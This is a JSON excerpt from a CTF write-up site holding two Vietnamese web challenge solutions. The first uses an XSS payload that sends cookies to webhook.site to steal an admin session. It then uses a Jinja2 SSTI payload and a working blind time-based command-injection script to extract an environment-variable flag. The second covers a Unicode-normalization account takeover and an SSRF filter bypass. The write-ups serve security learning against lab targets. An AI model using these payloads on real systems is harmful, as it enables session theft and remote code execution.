        "content": "\r\n# TL;DR\r\n\r\nChall l√† m·ªôt trang web v·ªÅ pokemon c√≥ t√≠nh nƒÉng ƒëƒÉng k√≠, ƒëƒÉng nh·∫≠p v√† g·ª≠i link cho bot\r\n\r\nKhi login th√†nh c√¥ng s·∫Ω ƒë∆∞·ª£c redirect v·ªÅ m√†n h√¨nh ch√≠nh v√† t√™n user s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã l√™n m√†n h√¨nh th√¥ng qua endpoint `home?name=` v√† c√°i n√†y d√≠nh l·ªó h·ªïng **XSS**\r\n\r\nL·ª£i d·ª•ng ƒëi·ªÅu ƒë√≥ ƒë·ªÉ l·∫•y cookie c·ªßa admin th√¥ng qua con bot ƒë·ªÉ truy c·∫≠p v√†o admin dashboard\r\n\r\nT·ª´ ƒë√≥ ta c√≥ th·ªÉ t·∫£i source code backup c·ªßa server v√† t√¨m ra l·ªó h·ªïng **SSTI**\r\n\r\nFlag ƒë∆∞·ª£c l∆∞u trong bi·∫øn m√¥i tr∆∞·ªùng v√† d√π k√≠ch ho·∫°t ƒë∆∞·ª£c SSTI ta c≈©ng kh√¥ng c√≥ c√°ch n√†o ƒë·ªÉ hi·ªÉn th·ªã k·∫øt qu·∫£ n√™n ta vi·∫øt m·ªôt script time based ƒë·ªÉ check t·ª´ng k√≠ t·ª± c·ªßa flag\r\nl√† ho√†n th√†nh chall\r\n\r\n# Rabbit hole\r\n\r\nKhi login th√†nh c√¥ng vi·ªác ƒë·∫ßu ti√™n m√¨nh l√†m l√† **dirsearch** (l√∫c n√†y ch∆∞a th·∫•y l·ªó h·ªïng XSS) v√† th·∫•y m·ªôt endpoint k√¨ l·∫°:\r\n\r\n`/console`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/nonerb.png)\r\n\r\nƒê·∫≠p v√†o m·∫Øt m√¨nh l√† m·ªôt b·∫£ng hi·ªÉn th·ªã y√™u c·∫ßu m√¨nh nh·∫≠p pin ƒë·ªÉ c√≥ th·ªÉ truy c·∫≠p v√†o ph·∫ßn ƒë·∫±ng sau\r\n\r\nSau ƒë·∫•y m√¨nh Ctrl u ƒë·ªÉ ƒë·ªçc source xem c√≥ g√¨ khai th√°c ƒë∆∞·ª£c kh√¥ng\r\n\r\n```html\r\n<!doctype html>\r\n<html lang=en>\r\n  <head>\r\n    <title>Console // Werkzeug Debugger</title>\r\n    <link rel=\"stylesheet\" href=\"?__debugger__=yes&amp;cmd=resource&amp;f=style.css\">\r\n    <link rel=\"shortcut icon\"\r\n        href=\"?__debugger__=yes&amp;cmd=resource&amp;f=console.png\">\r\n    <script src=\"?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js\"></script>\r\n    <script>\r\n      var CONSOLE_MODE = true,\r\n          EVALEX = true,\r\n          EVALEX_TRUSTED = false,\r\n          SECRET = \"h0V5UCkMAwRY5o7jkzEa\";\r\n    </script>\r\n  </head>\r\n  <body style=\"background-color: #fff\">\r\n    <div class=\"debugger\">\r\n<h1>Interactive Console</h1>\r\n<div class=\"explanation\">\r\nIn this console you can execute Python expressions in the context of the\r\napplication.  The initial namespace was created by the debugger automatically.\r\n</div>\r\n<div class=\"console\"><div class=\"inner\">The Console requires JavaScript.</div></div>\r\n      <div class=\"footer\">\r\n        Brought to you by <strong class=\"arthur\">DON'T PANIC</strong>, your\r\n        friendly Werkzeug powered traceback interpreter.\r\n      </div>\r\n    </div>\r\n\r\n    <div class=\"pin-prompt\">\r\n      <div class=\"inner\">\r\n        <h3>Console Locked</h3>\r\n        <p>\r\n          The console is locked and needs to be unlocked by entering the PIN.\r\n          You can find the PIN printed out on the standard output of your\r\n          shell that runs the server.\r\n        <form>\r\n          <p>PIN:\r\n            <input type=text name=pin size=14>\r\n            <input type=submit name=btn value=\"Confirm Pin\">\r\n        </form>\r\n      </div>\r\n    </div>\r\n  </body>\r\n</html\r\n```\r\n\r\nM√¨nh ƒë·ªÉ √Ω th·∫•y ƒëo·∫°n n√†y c√≥ c√°i secret g√¨ ƒë√≥\r\n\r\n```js\r\n<script>\r\n  var CONSOLE_MODE = true, EVALEX = true, EVALEX_TRUSTED = false, SECRET =\r\n  \"h0V5UCkMAwRY5o7jkzEa\";\r\n</script>\r\n```\r\n\r\nTh·ª≠ nh·∫≠p v√†o xem c√≥ ƒë√∫ng m√£ pin l√† n√≥ kh√¥ng th√¨ k·∫øt qu·∫£ l·∫°i kh√¥ng m·∫•y kh·∫£ quan\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/nnnlnn.png)\r\n\r\nVi·ªác ti·∫øp theo m√¨nh l√†m l√† th·ª≠ x√≥a nh·ªØng ph·∫ßn ch·∫Øn ƒë·∫±ng tr∆∞·ªõc ƒëi b·∫±ng ublock origin th√¨ c√≥ v·∫ª l√† ƒë√£ truy c·∫≠p v√†o ƒë∆∞·ª£c ph·∫ßn b√™n trong\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/evscdfg.png)\r\n\r\nTi·∫øp t·ª•c ngh·ªãch c√°i console m·ªôt l√∫c l√¢u th√¨ cu·ªëi c√πng m√¨nh c≈©ng kh√¥ng thu ƒë∆∞·ª£c k·∫øt qu·∫£ g√¨ c√≥ √≠ch c·∫£ :v\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/vclvcl.png)\r\n\r\nV√¨ title c·ªßa trang l√† `Console // Werkzeug Debugger` n√™n sau ƒë√≥ m√¨nh c√≥ google ƒë·ªÉ t√¨m xem c√≥ CVE n√†o c·ªßa th∆∞ vi·ªán werkzeug m√† m√¨nh c√≥ th·ªÉ s·ª≠ d·ª•ng kh√¥ng v√† t·∫•t nhi√™n l√† kh√¥ng ƒë∆∞·ª£c\r\n\r\nNg·ªìi r·∫•t l√¢u ·ªü ƒë√¢y m√¨nh m·ªõi quay v·ªÅ trang ch√≠nh v√† nh·∫≠n ra l·ªó h·ªïng to ƒë√πng n·∫±m ngay tr∆∞·ªõc m·∫Øt :v\r\n\r\n# Exploit and get flag\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/hgfhtrhrt.png)\r\n\r\nSau khi ƒëƒÉng nh·∫≠p th√†nh c√¥ng th√¨ m√¨nh ƒë∆∞·ª£c chuy·ªÉn t·ªõi trang n√†y\r\n\r\nSau khi d√†nh m·ªôt ƒë·ªëng th·ªùi gian b√™n `/console` th√¨ khi quay l·∫°i ƒë√¢y m√¨nh th·∫•y tr√™n url c√≥ hi·ªán username c·ªßa m√¨nh ngay tr√™n ƒë·∫•y\r\n\r\n`/home?name=user`\r\n\r\nTh·ª≠ thay ƒë·ªïi tham s·ªë `name` th√¨ k·∫øt qu·∫£ c≈©ng s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ngay tr√™n trang\r\n\r\n`/home?name=gaugaugau`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/nvkshe.png)\r\n\r\nC√°i n√†y hi·ªÉn nhi√™n l√† h∆∞·ªõng t·ªõi vi·ªác khai th√°c l·ªó h·ªïng **XSS** do ta c√≥ th·ªÉ g·ª≠i link cho bot ki·ªÉm tra ·ªü `/report`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/mvcvml.png)\r\n\r\nTh·ª≠ vi·∫øt lu√¥n payload g·ª≠i cookie v·ªÅ webhook:\r\n\r\n```html\r\n<img\r\n  src=\"x\"\r\n  onerror=\"fetch(`https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${document.cookie}`)\"\r\n/>\r\n```\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/cdhkff.png)\r\n\r\nTuy·ªát ^\\_^ XSS th√†nh c√¥ng vi·ªác c√≤n l·∫°i ch·ªâ l√† g·ª≠i link cho con bot th√¥i\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/zzzzzz.png)\r\n\r\n`session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT-Rng.tr0vKlULRki3w6n0BFsZT3_vav8`\r\n\r\nS·ª≠ d·ª•ng cookie ƒë√≥ m√¨nh c√≥ ƒë∆∞·ª£c quy·ªÅn c·ªßa admin\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/xxxxx.png)\r\n\r\n---\r\n\r\nTruy c·∫≠p v√†o `admin panel` m√¨nh nh·∫≠n ƒë∆∞·ª£c giao di·ªán nh∆∞ sau\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/ccccccc.png)\r\n\r\nNh·∫•n v√†o `Download Backup` m√¨nh t·∫£i ƒë∆∞·ª£c source code c·ªßa c·∫£ challange\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/silver/vvvvvvvv.png)\r\n\r\nM√¨nh ti·∫øn h√†nh kh·∫£o s√°t hai file docker th√¨ th·∫•y flag ƒë∆∞·ª£c l∆∞u trong bi·∫øn m√¥i tr∆∞·ªùng d·ª±a v√†o `docker-compose.yaml`\r\n\r\n**docker-compose.yaml**\r\n\r\n```yaml\r\nversion: \"3.8\"\r\n\r\nservices:\r\n  web:\r\n    build: .\r\n    ports:\r\n      - \"5000:5000\"\r\n    environment:\r\n      - ADMIN_PASSWORD=admin123\r\n      - FLAG=KCSC{REDACTED}\r\n```\r\n\r\nTi·∫øp t·ª•c kh·∫£o s√°t t·ªõi file `app.py` m√¨nh ph√°t hi·ªÉn ra ngay l·ªó h·ªïng **SSTI**\r\n\r\n**app.py**\r\n\r\n```py\r\n...\r\n@app.route('/admin/report-generator', methods=['GET', 'POST'])\r\n@admin_required\r\ndef report_generator():\r\n    if request.method == 'GET':\r\n        return render_template('report_generator.html')\r\n\r\n    data = request.json\r\n    template_content = data.get('template', '')\r\n\r\n    if not template_content:\r\n        return jsonify({'error': 'Template content is required'}), 400\r\n\r\n    if len(template_content) > 55:\r\n        return jsonify({'error': 'Template too long (max 55 chars)'}), 400\r\n\r\n    try:\r\n        render_template_string(template_content)\r\n    except Exception:\r\n        pass\r\n\r\n    return jsonify({\r\n        'success': True,\r\n        'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')\r\n    }), 200\r\n...\r\n```\r\n\r\n**Endpoint**: `/admin/report-generator`\r\n\r\nS∆° l∆∞·ª£c v·ªÅ c√°ch m√† endpoint n√†y ho·∫°t ƒë·ªông (gi·∫£ s·ª≠ ƒë√£ c√≥ session c·ªßa admin):\r\n\r\n- N·∫øu c√≥ m·ªôt request **GET** t·ªõi endpoint n√†y th√¨ n√≥ s·∫Ω render `report_generator.html'`\r\n\r\n- C√≤n n·∫øu request l√† **POST** th√¨ n√≥ s·∫Ω t√¨m tham s·ªë `template` trong body\r\n\r\n  - N·∫øu `template` tr·ªëng ho·∫∑c kh√¥ng c√≥ ho·∫∑c s·ªë k√≠ t·ª± > 55 th√¨ th√¨ s·∫Ω ngay l·∫≠p t·ª©c tr·∫£ v·ªÅ status 400\r\n\r\n  - C√≤n n·∫øu kh√¥ng th√¨ kh√¥ng v√¨ m·ªôt l√Ω do n√†o, n√≥ s·∫Ω th·ª≠ render n·ªôi dung trong template th√¥ng qua `render_template_string` r·ªìi tr·∫£ v·ªÅ th·ªùi gian nh·∫≠n request v·ªõi status 200\r\n\r\nƒê·∫øn ƒë√¢y th√¨ m√¨nh ch·∫Øc ch·∫Øn √Ω ƒë·ªì c·ªßa t√°c gi·∫£ l√† khai th√°c l·ªó h·ªïng **SSTI** ƒë·ªÉ l·∫•y flag trong bi·∫øn m√¥i tr∆∞·ªùng r·ªìi\r\n\r\nNh∆∞ng m√† ·ªü ƒë√¢y xu·∫•t hi·ªán hai v·∫•n ƒë·ªÅ nh∆∞ sau:\r\n\r\n- `app.py` ƒë∆°n gi·∫£n ch·ªâ th·ª≠ render n·ªôi dung trong template ch·ª© kh√¥ng h·ªÅ return khi·∫øn ta kh√¥ng th·ªÉ bi·∫øt ƒë∆∞·ª£c output c·ªßa n√≥ nh∆∞ th·∫ø n√†o\r\n\r\n- `template` ch·ªâ c√≥ th·ªÉ c√≥ ƒë·ªô d√†i t·ªëi ƒëa l√† 55 cho n√™n m√¨nh ph·∫£i t√¨m c√°ch ƒë·ªÉ r√∫t ng·∫Øn payload l·∫°i\r\n\r\nV·ªõi vi·ªác kh√¥ng bi·∫øt ƒë∆∞·ª£c output th√¨ m√¨nh ch·ªâ c√≤n c√°ch ƒëo√°n m√≤ t·ª´ng k√≠ t·ª± c·ªßa flag th√¥ng qua **th·ªùi gian** v√† ph·∫£i t√¨m c√°ch ƒë·ªÉ t·ªëi ∆∞u sao cho payload ng·∫Øn nh·∫•t c√≥ th·ªÉ\r\n\r\n> _T·ªõi ƒë√¢y m√¨nh ƒë√£ th·ª≠ r·∫•t nhi·ªÅu c√°ch kh√°c nhau ƒë·ªÉ v·ª´a khi·∫øn cho server ph·∫£i ch·∫°y ch·∫≠m ƒëi, v·ª´a t√¨m c√°ch ƒë·ªÉ t·ªëi ∆∞u sao cho ƒë·ªô d√†i payload ng·∫Øn nh·∫•t c√≥ th·ªÉ. Th·∫≠m ch√≠ m√¨nh c√≤n v√¥ t√¨nh l√†m instance ƒë∆° h·∫≥n ƒë√¢m ra l√† m√¨nh v·ª´a kh√¥ng th·ªÉ ti·∫øp t·ª•c g·ª≠i request v·ª´a kh√¥ng th·ªÉ reset l·∫°i instance do kh√¥ng fetch ƒë∆∞·ª£c =))))_\r\n>\r\n> _C≈©ng may l√† sau ƒë√≥ nh·ªù ban ra ƒë·ªÅ c·∫•p c·ª©u m√† m√¨nh m·ªõi c√≥ th·ªÉ ti·∫øp t·ª•c l√†m b√†i <3 e c·∫£m ∆°n clb ·∫° <3_\r\n\r\nSau m·ªôt h·ªìi google ~~gemini~~ th√¨ m√¨nh cu·ªëi c√πng c≈©ng c√≥ m·ªôt payload d√πng ƒë∆∞·ª£c:\r\n\r\n```\r\n{{lipsum.__globals__.os.system(request.args.c)}}\r\n```\r\n\r\n**Ph√¢n t√≠ch payload**:\r\n\r\n- `lipsum.__globals__.os.system()`: bypass sandbox c∆° b·∫£n c·ªßa Jinja2\r\n\r\n- `request.args.c`: Thay v√¨ t√¨m c√°ch l·ªìng c√°c l·ªánh ph·ª©c t·∫°p v√†o m·ªôt payload gi·ªõi h·∫°n th√¨ ta t·∫≠n d·ª•ng object c√≥ s·∫µn c·ªßa Jinja2 l√† `request` ƒë·ªÉ l·∫•y l·ªánh th·∫≠t s·ª± t·ª´ tham s·ªë -> payload ng·∫Øn ƒëi r·∫•t nhi·ªÅu v√† l·ªánh th·∫≠t s·ª± c·∫ßn k√≠ch ho·∫°t kh√¥ng b·ªã r√†ng bu·ªôc g√¨ v·ªÅ ƒë·ªô d√†i\r\n\r\nKhi ƒë√≥ tham s·ªë `c` ch·ªâ c·∫ßn l√† l·ªánh shell l·∫•y c√°c k√≠ t·ª± c·ªßa flag v√† ki·ªÉm tra th√¥i\r\n\r\n**script.py**\r\n\r\n```py\r\nimport requests\r\n\r\nURL = \"http://67.223.119.69:33083/admin/report-generator\"\r\nCOOKIE = { \"session\": \"eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.aT-mGA.Nf1tkuFt5ASC2t0BA3_i7z_IGNY\" }\r\nPAYLOAD = \"{{lipsum.__globals__.os.system(request.args.c)}}\"\r\n\r\nflag = \"KCSC{\"\r\n\r\nwhile flag[-1] != '}':\r\n    print(flag)\r\n\r\n    index = len(flag) + 1\r\n\r\n    l = 32\r\n    r = 127\r\n\r\n    while l < r:\r\n        mid = (l + r) // 2\r\n\r\n        param = {\r\n            'c': f'if [ {mid} -ge $(printf \"%d\" \"\\'$(echo $FLAG | cut -c {index})\") ]; then sleep 3; fi'\r\n        }\r\n        ok = False\r\n\r\n        try:\r\n            response = requests.post(\r\n                url=URL,\r\n                cookies=COOKIE,\r\n                json={ 'template': PAYLOAD },\r\n                params=param,\r\n                timeout=2\r\n            )\r\n\r\n        except requests.exceptions.ReadTimeout:\r\n            ok = True\r\n\r\n        if ok:\r\n            r = mid\r\n        else:\r\n            l = mid + 1\r\n\r\n    if l == 127: # khong tim thay\r\n        print(\"Kh√¥ng t√¨m th·∫•y n·ªØa :(\")\r\n        exit()\r\n\r\n    flag += chr(l)\r\n\r\nprint(flag)\r\n```\r\n\r\nV√¨ vi·ªác l·∫•y flag b·∫±ng time based r·∫•t t·ªën th·ªùi gian n√™n m√¨nh t·ªëi ∆∞u script t√¨m b·∫±ng t√¨m ki·∫øm nh·ªã ph√¢n\r\n\r\nDo ƒë√≥ tham s·ªë `c` m√† m√¨nh ch·ªçn l√†\r\n\r\n```bash\r\nif [ {mid} -ge $(printf \"%d\" \"\\'$(echo $FLAG | cut -c {index})\") ]; then sleep 3; fi\r\n```\r\n\r\nL·ªánh ƒë∆°n gi·∫£n l√† ki·ªÉm tra xem k√≠ t·ª± m√¨nh ƒëang ki·ªÉm tra c√≥ m√£ ascii l·ªõn h∆°n ho·∫∑c b·∫±ng m√£ ascii c·ªßa flag t·∫°i ch·ªâ s·ªë hi·ªán t·∫°i kh√¥ng -> n·∫øu c√≥ th√¨ cho server ng·ªß 3s ƒë·ªÉ l√†m cho request timeout. C√≤n l·∫°i l√† binary search c∆° b·∫£n\r\n\r\nCh·∫°y script tr√™n ta ƒë∆∞·ª£c\r\n\r\n```\r\n...\r\nKCSC{G0tt4_h4ck_'3m\r\nKCSC{G0tt4_h4ck_'3m_\r\nKCSC{G0tt4_h4ck_'3m_4\r\nKCSC{G0tt4_h4ck_'3m_4l\r\nKCSC{G0tt4_h4ck_'3m_4ll\r\nKCSC{G0tt4_h4ck_'3m_4ll!\r\nKCSC{G0tt4_h4ck_'3m_4ll!}\r\n```\r\n\r\n**Flag**: `KCSC{G0tt4_h4ck_'3m_4ll!}`\r\n",
        "tags": []
      },
      {
        "id": "Simple_Web",
        "slug": "simple_web",
        "title": "Simple Web",
        "category": "Web",
        "author": "l1nx1n",
        "points": 388,
        "difficulty": "Medium",
        "readTime": "2 min",
        "date": "15-12-2025",
        "description": "A simple website covers some secrets. You must login as admin user. But how can you do that?\n\nHint: unicode normalize",
        "content": "\r\n# TL;DR\r\n\r\nChall n√†y y√™u c·∫ßu m√¨nh t√¨m c√°c ƒëƒÉng nh·∫≠p v√†o t√†i kho·∫£n `admin` sau ƒë√≥ t√¨m c√°ch ƒë·ªÉ ƒë·ªçc ƒë∆∞·ª£c ƒë·ªÉ truy c·∫≠p ƒë∆∞·ª£c v√†o enpoint `/flag` b·∫±ng c√°ch bypass b·ªô l·ªçc\r\n\r\n# Solution\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/43trterg.png)\r\n\r\nƒê√¢y l√† giao di·ªán khi ta m·ªõi m·ªü trang web l√™n\r\n\r\nTh·ª≠ ƒëƒÉng k√≠ v·ªõi `username` l√† `admin` th√¨ m√¨nh ngay l·∫≠p t·ª©c b·ªã ch·∫∑n\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/vdse.png)\r\n\r\nD·ª±a v√†o hint c·ªßa t√°c gi·∫£ m√¨nh nghƒ© ngay t·ªõi k·ªãch b·∫£n t·∫°o t√†i kho·∫£n m·ªõi v·ªõi `username` na n√° `admin` nh∆∞ng s·∫Ω ƒë·ªïi m·ªôt k√≠ t·ª± sang b·∫£ng m√£ kh√°c\r\n\r\nM·ª•c ƒë√≠ch ban ƒë·∫ßu c·ªßa m√¨nh l√† t·∫°o m·ªôt t√†i kho·∫£n t∆∞∆°ng t·ª± `admin` ƒë·ªÉ v∆∞·ª£t qua ph·∫ßn login sau ƒë√≥ c·∫ßu mong t·∫•t c·∫£ nh·ªØng h√†m ki·ªÉm tra b√™n trong ƒë·ªÅu s·∫Ω normalize username c·ªßa m√¨nh\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/ggjoir.png)\r\n\r\n·ªû ƒë√¢y m√¨nh thay k√≠ t·ª± a trong `admin` th√†nh ÔΩÅ\r\n\r\nƒêƒÉng k√≠ th√†nh c√¥ng v√† khi ƒëƒÉng nh·∫≠p l·∫°i b·∫±ng `admin` b√¨nh th∆∞·ªùng th√¨ m√¨nh ƒëƒÉng nh·∫≠p ƒë∆∞·ª£c -> ch·ª©ng t·ªè l√† n√≥ ƒë√£ v∆∞·ª£t qua ph·∫ßn ki·ªÉm tra admin v√† khi c·∫≠p nh·∫≠t l√™n database th√¨ ƒë∆∞·ª£c normalize v√† ghi ƒë√® l√™n `admin` c≈©\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/ehfhgdfg.png)\r\n\r\nM√¨nh c√≥ th·ª≠ gh√© qua endpoint `/flag` th√¨ nh·∫≠n ƒë∆∞·ª£c m·ªôt response duy nh·∫•t l√†\r\n\r\n`Only local access allowed`\r\n\r\nSau ƒë·∫•y m√¨nh th·∫•y giao di·ªán ·ªü `/admin` y√™u c·∫ßu nh·∫≠p url ƒë·ªÉ check c·ªông v·ªõi response v·ª´a r·ªìi th√¨ m√¨nh ti·∫øn h√†nh th·ª≠ ƒëi·ªÅn endpoint ƒë√≥ v√†o √¥ nh∆∞ng ƒë·ªïi th√†nh `localhost` xem sao\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/34t34.png)\r\n\r\n`You can not access the flag directly`\r\n\r\nKh√¥ng v√†o ƒë∆∞·ª£c `/flag` m√¨nh th·ª≠ ti·∫øp `/admin`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/636363.png)\r\n\r\nSau ƒë·∫•y ƒëo·∫°n n√†y m√¨nh b√≠... m√¨nh th·ª≠ fuzzing m·ªôt h·ªìi l√¢u th√¨ t·∫•t c·∫£ nh·ªØng g√¨ m√¨nh thu ƒë∆∞·ª£c l√† n√≥ s·∫Ω fetch n·ªôi dung c·ªßa url m√† m√¨nh ƒëi·ªÅn v√†o v√† hi·ªÉn th·ªã l√™n m√†n h√¨nh\r\n\r\nV·ªÅ sau th√¨ m√¨nh c√≥ nh·ªù th√™m AI gen cho m√¨nh m·ªôt ƒë·ªëng th·ª© ƒë·ªÉ fuzzing n·ªØa th√¨ cu·ªëi c√πng c≈©ng c√≥ m·ªôt c√°i ho·∫°t ƒë·ªông\r\n\r\n`http://localhost/flag?`\r\n\r\n![](/images/writeups/KCSC_Recruitment_2026/Web/Simple_Web/ncnsdf.png)\r\n\r\nTh·∫ø l√† t·ª± d∆∞ng m√¨nh c√≥ flag ?:vv\r\n\r\nH·ªèi th·ª≠ anh ch·ªã trong ban ra ƒë·ªÅ th√¨ h√¨nh nh∆∞ c√≥ m·ªôt c√°ch n√†o ƒë·∫•y ƒë·ªÉ m√¨nh xem ƒë∆∞·ª£c ph·∫ßn n√≥ filter input ra sao nh∆∞ng m√≤ m√£i m√† m√¨nh v·∫´n kh√¥ng t√¨m ra O_O\r\n\r\n**Flag**: `KCSC{Y0u_kn0w_uRl_Globbing}`\r\n",
        "tags": []
      }
    ]
  }
];